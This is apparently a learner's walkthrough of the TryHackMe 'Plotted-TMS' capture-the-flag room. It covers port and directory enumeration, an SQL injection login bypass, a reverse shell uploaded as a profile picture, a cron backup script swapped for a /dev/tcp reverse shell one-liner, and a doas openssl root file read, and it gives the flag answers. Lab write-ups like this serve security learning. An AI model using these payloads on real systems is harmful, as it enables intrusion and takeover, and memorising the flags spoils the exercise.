# Plot TMS Walkthrough
### Link
- https://tryhackme.com/room/plottedtms
---
### Recon
```
nmap -sC -sC -Pn [IP]
```
**Namp scan result**
```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-23 13:46 EDT
Nmap scan report for 10.10.159.7
Host is up (0.098s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I tried the following URLs: http://[IP]/ and http://[IP]:445/. I will arrive directly to the Apache2 default page. 

---
### Enumeration
I try a first enumeration run directly with the IP.
```
sudo gobuster dir -u http://[IP] -w ~/[PATH]/directory-list-2.3-small.txt
```
**result**
```
/admin                (Status: 301) [Size: 310] [--> http://10.10.159.7/admin/]
/shadow               (Status: 200) [Size: 25]
/passwd               (Status: 200) [Size: 25]
```
I checked the content of **/admin** and found a file **id_rsa**. Here is the encrypted content of thie file:
```
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
```
I used myu favorite website []() and the pattern "From Base64" for this result ^^
```
Trust me it is not this easy..now get back to enumeration :D
```

Let's try the enmueration with the port **445**
```
sudo gobuster dir -u http://10.10.159.7:445 -w ~/Documents/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt

```
**result**
```
/management           (Status: 301) [Size: 320] [--> http://10.10.159.7:445/management/]
```
When I tried this URL, I directly join the **management** page with the **Login** button. When I cicked on it, the login window appears.
---
### Access

I searched and found information related to this type of portal and CMS and found an [exploit](https://www.exploit-db.com/exploits/50221)
```
.....
session = requests.session()

request_url = url + "/classes/Login.php?f=login"
post_data = {"username": "'' OR 1=1-- '", "password": "'' OR 1=1-- '"}
bypass_user = session.post(request_url, data=post_data)
.....
```
We can try this basic SQLi and it works ^^v. Nwo,  we are logged to the Admin console as **Administrator**. 

Another interesting information in the exploit comments:
```
File uploaded from "/admin/?page=user" has no validation check
```
That means we can upload a reverse shell script to gain access.Let's try it!!!

- First: Start a listener
```
nc -nlvp 4646
```
- Second : ReverseShell script settings. Change the IP and PORT with the appropriate information. For the IP, the local machine IP and for the PORT , I sued 4646
- Third : Create a fake profil and upload the reverse shell script as a picture
- Fourth: Click on **Save** and we obtian the Remote Access through the listener ^^

I found the first flag but I cannot open it....
```
$ ls
plot_admin
ubuntu
$ ls -l
total 8
drwxr-xr-x 4 plot_admin plot_admin 4096 Oct 28 10:16 plot_admin
drwxr-xr-x 4 ubuntu     ubuntu     4096 Oct 28 10:09 ubuntu
$ cd plot_admin
$ ls -l
total 8
drwxrwx--- 14 plot_admin plot_admin 4096 Oct 28 07:25 tms_backup
-rw-rw----  1 plot_admin plot_admin   33 Oct 28 09:55 user.txt
$ cat user.txt
cat: user.txt: Permission denied
```
---
### Privilege escalation to plot_admin

- First: Find something related to **plot_admin**
```
find / -type f -user plot_admin 2> /dev/null
```
**Result**
```
/var/www/scripts/backup.sh
/home/plot_admin/.bashrc
/home/plot_admin/.bash_logout
/home/plot_admin/user.txt
/home/plot_admin/.profile
```
**plot_admin** runs a script **backup.sh**. Let's check this script
```
$ cat /var/www/scripts/backup.sh
#!/bin/bash

/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
/bin/chmod -R 770 /home/plot_admin/tms_backup/management
```
Unfortunatelly, we cannot change the script content. But we can do something inside the folder **scripts**
```
/bin/chmod -R 770 /home/plot_admin/tms_backup/management
$ cd /var/www/
$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Oct 28 10:26 .
drwxr-xr-x 14 root     root     4096 Oct 28 07:07 ..
drwxr-xr-x  4 root     root     4096 Oct 28 09:18 html
drwxr-xr-x  2 www-data www-data 4096 Oct 28 09:10 scripts
$ cd scripts
$ ls -la
total 12
drwxr-xr-x 2 www-data   www-data   4096 Oct 28 09:10 .
drwxr-xr-x 4 root       root       4096 Oct 28 10:26 ..
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28 09:10 backup.sh
```
We can create our own script and chenge with the current.
- First: Create the new script
```
$ echo "bash -c 'exec bash -i &>/dev/tcp/[IP]/4545 <&1'" > MyScript.sh
$ ls -la
total 16
drwxr-xr-x 2 www-data   www-data   4096 Apr 23 18:34 .
drwxr-xr-x 4 root       root       4096 Oct 28 10:26 ..
-rw-rw-rw- 1 www-data   www-data     55 Apr 23 18:34 MyScript.sh
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28 09:10 backup.sh
```
- Second : Start a listener wi th the appropriate PORT. Here **4545**
```
nc -nlvp 4545
```
- Third : Rename the current **backup.sh** , rename the new script as **backup.sh** and give the appropriate rights
```
$ mv backup.sh original_backup.sh && mv MyScript.sh backup.sh && chmod +x backup.sh
$ ls -la
total 16
drwxr-xr-x 2 www-data   www-data   4096 Apr 23 18:38 .
drwxr-xr-x 4 root       root       4096 Oct 28 10:26 ..
-rwxrwxrwx 1 www-data   www-data     55 Apr 23 18:34 backup.sh
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28 09:10 original_backup.sh
```
- Fourth: wait few seconds
```
nc -nlvp 4545
Connection from 10.10.159.7:45996
bash: cannot set terminal process group (28899): Inappropriate ioctl for device
bash: no job control in this shell
plot_admin@plotted:~$
```
```
plot_admin@plotted:~$ id
id
uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
plot_admin@plotted:~$ ls -la
ls -la
total 32
drwxr-xr-x  4 plot_admin plot_admin 4096 Oct 28 10:16 .
drwxr-xr-x  4 root       root       4096 Oct 28 07:56 ..
lrwxrwxrwx  1 root       root          9 Oct 28 10:09 .bash_history -> /dev/null
-rw-r--r--  1 plot_admin plot_admin  220 Oct 28 07:56 .bash_logout
-rw-r--r--  1 plot_admin plot_admin 3771 Oct 28 07:56 .bashrc
drwxrwxr-x  3 plot_admin plot_admin 4096 Oct 28 08:34 .local
-rw-r--r--  1 plot_admin plot_admin  807 Oct 28 07:56 .profile
drwxrwx--- 14 plot_admin plot_admin 4096 Oct 28 07:25 tms_backup
-rw-rw----  1 plot_admin plot_admin   33 Oct 28 09:55 user.txt
plot_admin@plotted:~$ cat user.txt
cat user.txt
77927510d5edacea1f9e86602f1fbadb
```
**Question**
#### user.txt
**Answer** 
#### 77927510d5edacea1f9e86602f1fbadb
---
### Privilege escalation to root
Let's upgrade our shell to be more confortable
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Now, let's try something we can use with the appropriate permission defined
```
find / -type f -perm /4000 -ls 2>/dev/null
```
```
 56     43 -rwsr-xr-x   1 root     root        43088 Sep 16  2020 /snap/core18/2284/bin/mount
       65     63 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /snap/core18/2284/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44664 Mar 22  2019 /snap/core18/2284/bin/su
       99     27 -rwsr-xr-x   1 root     root        26696 Sep 16  2020 /snap/core18/2284/bin/umount
     1720     75 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /snap/core18/2284/usr/bin/chfn
     1722     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /snap/core18/2284/usr/bin/chsh
     1775     75 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /snap/core18/2284/usr/bin/gpasswd
     1839     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /snap/core18/2284/usr/bin/newgrp
     1852     59 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /snap/core18/2284/usr/bin/passwd
     1943    146 -rwsr-xr-x   1 root     root       149080 Jan 19  2021 /snap/core18/2284/usr/bin/sudo
     2031     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2341    427 -rwsr-xr-x   1 root     root              436552 Aug 11  2021 /snap/core18/2284/usr/lib/openssh/ssh-keysign
       56     43 -rwsr-xr-x   1 root     root               43088 Sep 16  2020 /snap/core18/2246/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/2246/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/2246/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Sep 16  2020 /snap/core18/2246/bin/umount
     1719     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/2246/usr/bin/chfn
     1721     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/2246/usr/bin/chsh
     1774     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/2246/usr/bin/gpasswd
     1838     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/2246/usr/bin/newgrp
     1851     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/2246/usr/bin/passwd
     1942    146 -rwsr-xr-x   1 root     root              149080 Jan 19  2021 /snap/core18/2246/usr/bin/sudo
     2030     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/2246/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2340    427 -rwsr-xr-x   1 root     root              436552 Aug 11  2021 /snap/core18/2246/usr/lib/openssh/ssh-keysign
      811     84 -rwsr-xr-x   1 root     root               85064 Jul 14  2021 /snap/core20/1328/usr/bin/chfn
      817     52 -rwsr-xr-x   1 root     root               53040 Jul 14  2021 /snap/core20/1328/usr/bin/chsh
      886     87 -rwsr-xr-x   1 root     root               88464 Jul 14  2021 /snap/core20/1328/usr/bin/gpasswd
      970     55 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /snap/core20/1328/usr/bin/mount
      979     44 -rwsr-xr-x   1 root     root               44784 Jul 14  2021 /snap/core20/1328/usr/bin/newgrp
      992     67 -rwsr-xr-x   1 root     root               68208 Jul 14  2021 /snap/core20/1328/usr/bin/passwd
     1101     67 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /snap/core20/1328/usr/bin/su
     1102    163 -rwsr-xr-x   1 root     root              166056 Jan 19  2021 /snap/core20/1328/usr/bin/sudo
     1160     39 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /snap/core20/1328/usr/bin/umount
     1247     51 -rwsr-xr--   1 root     systemd-resolve    51344 Jun 11  2020 /snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1619    463 -rwsr-xr-x   1 root     root              473576 Dec  2 22:38 /snap/core20/1328/usr/lib/openssh/ssh-keysign
      803     84 -rwsr-xr-x   1 root     root               85064 Jul 14  2021 /snap/core20/1169/usr/bin/chfn
      809     52 -rwsr-xr-x   1 root     root               53040 Jul 14  2021 /snap/core20/1169/usr/bin/chsh
      878     87 -rwsr-xr-x   1 root     root               88464 Jul 14  2021 /snap/core20/1169/usr/bin/gpasswd
      962     55 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /snap/core20/1169/usr/bin/mount
      971     44 -rwsr-xr-x   1 root     root               44784 Jul 14  2021 /snap/core20/1169/usr/bin/newgrp
      984     67 -rwsr-xr-x   1 root     root               68208 Jul 14  2021 /snap/core20/1169/usr/bin/passwd
     1093     67 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /snap/core20/1169/usr/bin/su
     1094    163 -rwsr-xr-x   1 root     root              166056 Jan 19  2021 /snap/core20/1169/usr/bin/sudo
     1152     39 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /snap/core20/1169/usr/bin/umount
     1238     51 -rwsr-xr--   1 root     systemd-resolve    51344 Jun 11  2020 /snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1610    463 -rwsr-xr-x   1 root     root              473576 Jul 23  2021 /snap/core20/1169/usr/lib/openssh/ssh-keysign
      133    121 -rwsr-xr-x   1 root     root              123464 Jan  7 01:11 /snap/snapd/14549/usr/lib/snapd/snap-confine
      133    113 -rwsr-xr-x   1 root     root              115208 Oct  5  2021 /snap/snapd/13640/usr/lib/snapd/snap-confine


  1049433     68 -rwsr-xr-x   1 root     root               68208 Jul 14  2021 /usr/bin/passwd
  1049659    164 -rwsr-xr-x   1 root     root              166056 Jan 19  2021 /usr/bin/sudo
  1049252     88 -rwsr-xr-x   1 root     root               88464 Jul 14  2021 /usr/bin/gpasswd
  1049386     56 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount
  1049658     68 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /usr/bin/su
  1049121     84 -rwsr-xr-x   1 root     root               85064 Jul 14  2021 /usr/bin/chfn
  1049234     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
  1049053     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
  1049127     52 -rwsr-xr-x   1 root     root               53040 Jul 14  2021 /usr/bin/chsh
  1049730     40 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /usr/bin/umount
  1067622     40 -rwsr-xr-x   1 root     root               39008 Feb  5  2021 /usr/bin/doas
  1049400     44 -rwsr-xr-x   1 root     root               44784 Jul 14  2021 /usr/bin/newgrp
  1051626     20 -rwsr-xr-x   1 root     root               19040 Jun  3  2021 /usr/libexec/polkit-agent-helper-1
.....
```
Very long long long list...... But this **doas** is not an usual item we cna find into SUID list
```
  1067622     40 -rwsr-xr-x   1 root     root               39008 Feb  5  2021 /usr/bin/doas
```
I performed a research to find all files related to **doas** and found this
```
find: ‘/proc/31086/task/31086/ns’: Permission denied
find: ‘/proc/31086/fd’: Permission denied
find: ‘/proc/31086/map_files’: Permission denied
find: ‘/proc/31086/fdinfo’: Permission denied
find: ‘/proc/31086/ns’: Permission denied
find: ‘/proc/31201’: No such file or directory
find: ‘/root’: Permission denied
/etc/doas.conf
```
Check the **doas.conf**
```
plot_admin@plotted:~$ cat /etc/doas.conf
cat /etc/doas.conf
permit nopass plot_admin as root cmd openssl
```
Great information. We can run **openssl**. Let's check [GTFOBINS/openssl](https://gtfobins.github.io/gtfobins/openssl/#file-read)
```
plot_admin@plotted:~$ file=/root/root.txt
file=/root/root.txt
plot_admin@plotted:~$ echo $file
echo $file
/root/root.txt
plot_admin@plotted:~$ doas openssl enc -in "$file"
doas openssl enc -in "$file"
Congratulations on completing this room!

53f85e2da3e874426fa059040a9bdcab

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
```
**Question**
#### root.txt
**Answer** 
#### 53f85e2da3e874426fa059040a9bdcab